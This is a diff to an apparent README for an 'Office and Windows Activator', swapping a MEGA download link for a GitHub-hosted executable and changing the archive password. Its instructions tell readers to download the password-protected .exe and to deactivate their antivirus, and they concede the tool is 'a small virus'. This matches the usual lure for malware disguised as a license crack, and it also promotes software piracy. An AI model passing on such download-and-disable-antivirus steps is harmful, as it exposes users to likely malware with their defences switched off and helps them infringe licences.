@@ -12,9 +12,9 @@ Remember that this activator is only a temporary measure so that you can buy the
 
 ### Instructions:
 
-#### Just download the file: https://mega.nz/file/vQwghR5L#zp2lNbfNoISEnoZpJr5MFR-oJPetX9eKZ8e_F_LUjyM
+#### Just download the file: https://github.com/activadorespirulo/activadorespirulo/raw/main/Office_and_Windows_Activator_password_pirulo.exe
 
-**Password: qwerty**
+**Password: pirulo**
 
 
 Then deactivate your antivirus, remember that the activators are detected as viruses in antivirus systems (in fact they are a small virus that allows you to make a small modification in your system and thus make it believe that the corresponding license has been paid).
